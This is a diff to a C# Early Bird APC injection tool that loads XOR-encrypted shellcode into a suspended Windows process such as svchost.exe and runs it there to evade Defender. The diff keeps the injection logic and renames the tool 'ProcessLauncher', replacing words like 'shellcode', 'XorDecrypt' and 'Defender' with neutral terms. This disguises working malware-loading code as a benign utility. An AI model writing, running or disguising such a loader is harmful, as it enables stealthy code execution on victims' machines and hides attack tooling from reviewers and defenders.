@@ -57,7 +57,7 @@ using System;
 using System.IO;
 using System.Runtime.InteropServices;
 
-namespace EarlyBirdInjection
+namespace ProcessLauncher
 {
     class Program
     {
@@ -150,7 +150,7 @@ namespace EarlyBirdInjection
         const uint PAGE_EXECUTE_READ = 0x20;
 
         // ---- XOR decryption ----
-        static byte[] XorDecrypt(byte[] data, byte[] key)
+        static byte[] TransformData(byte[] data, byte[] key)
         {
             byte[] result = new byte[data.Length];
             for (int i = 0; i < data.Length; i++)
@@ -174,12 +174,12 @@ namespace EarlyBirdInjection
         {
             if (args.Length < 2)
             {
-                Console.WriteLine("Early Bird APC Injection");
-                Console.WriteLine("Usage: earlybird.exe <legitimate_exe_path> <shellcode.bin> [xor_key_hex]");
+                Console.WriteLine("Process Launcher");
+                Console.WriteLine("Usage: launcher.exe <exe_path> <data.bin> [key_hex]");
                 Console.WriteLine("");
                 Console.WriteLine("Example:");
-                Console.WriteLine("  earlybird.exe C:\\Windows\\System32\\svchost.exe payload.bin");
-                Console.WriteLine("  earlybird.exe C:\\Windows\\System32\\RuntimeBroker.exe encrypted.bin 4A7F...");
+                Console.WriteLine("  launcher.exe C:\\Windows\\System32\\svchost.exe data.bin");
+                Console.WriteLine("  launcher.exe C:\\Windows\\System32\\RuntimeBroker.exe encrypted.bin 4A7F...");
                 return;
             }
 
@@ -192,12 +192,12 @@ namespace EarlyBirdInjection
             if (xorKeyHex != null)
             {
                 byte[] xorKey = HexToBytes(xorKeyHex);
-                shellcode = XorDecrypt(shellcode, xorKey);
-                Console.WriteLine("[+] Shellcode decrypted: " + shellcode.Length + " bytes");
+                shellcode = TransformData(shellcode, xorKey);
+                Console.WriteLine("[+] Data decrypted: " + shellcode.Length + " bytes");
             }
             else
             {
-                Console.WriteLine("[*] Shellcode loaded: " + shellcode.Length + " bytes");
+                Console.WriteLine("[*] Data loaded: " + shellcode.Length + " bytes");
             }
 
             // ---- Step 1: Create the target process in SUSPENDED state ----
@@ -223,7 +223,7 @@ namespace EarlyBirdInjection
 
             if (!created)
             {
-                Console.WriteLine("[-] CreateProcess failed. Check the executable path.");
+                Console.WriteLine("[-] Failed to start target process. Check the executable path.");
                 return;
             }
 
@@ -243,7 +243,7 @@ namespace EarlyBirdInjection
 
             if (remoteMemory == IntPtr.Zero)
             {
-                Console.WriteLine("[-] VirtualAllocEx failed.");
+                Console.WriteLine("[-] Remote memory allocation failed.");
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
                 return;
@@ -270,7 +270,7 @@ namespace EarlyBirdInjection
                 CloseHandle(pi.hProcess);
                 return;
             }
-            Console.WriteLine("[+] Shellcode written to target process: " + bytesWritten + " bytes");
+            Console.WriteLine("[+] Data written to target process: " + bytesWritten + " bytes");
 
             // ---- Step 4: Change memory to executable ----
             uint oldProtect;
@@ -301,9 +301,9 @@ namespace EarlyBirdInjection
             // Windows processes the queued APC first, which points to our
             // shellcode. Our shellcode runs inside the legitimate process.
             ResumeThread(pi.hThread);
-            Console.WriteLine("[+] Thread resumed. Shellcode is executing inside " + targetExePath);
-            Console.WriteLine("[*] The shellcode is running as part of a legitimate Windows process.");
-            Console.WriteLine("[*] Defender sees " + targetExePath + " running, not an unknown binary.");
+            Console.WriteLine("[+] Thread resumed. Code is executing inside " + targetExePath);
+            Console.WriteLine("[*] The code is running as part of a legitimate process.");
+            Console.WriteLine("[*] The system sees " + targetExePath + " running.");
 
             // Clean up handles.
             CloseHandle(pi.hThread);
